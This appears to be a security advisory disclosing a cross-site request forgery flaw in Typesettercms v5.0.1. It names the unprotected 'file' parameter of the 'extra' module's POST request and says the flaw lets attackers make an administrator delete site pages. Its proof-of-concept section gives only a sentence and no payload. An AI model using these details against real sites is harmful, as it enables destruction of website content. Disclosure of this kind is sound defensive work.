================================
A cross site request forgery web vulnerability has been discovered in the official Typesettercms v5.0.1 web-application.
The issue allows remote attackers to manipulate client-side browser to web-application requests to execute service functions 
via non-expired session credentials.

The cross site request forgery vulnerability is located in the cms `file` parameter of the `extra` module POST method request.
In the absence of a security token an attacker can execute code arbitrary against administrator account to permanenly delete 
the pages of the website via panel. Due to the infrastructure the issue becomes more critical without a checkbox to confirm 
the delete of any page.

The security risk of the client-side web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.0.
Exploitation of the non-persistent web vulnerability requires no privileged web application user account and low or medium user interaction. 
Successful exploitation of the vulnerability results in the execute of the delete function of pages without secure approval or validation.


Proof of Concept (PoC):
=======================
The csrf web vulnerability can be exploited by remote attackers without privileged web-application user account and with low user interaction.
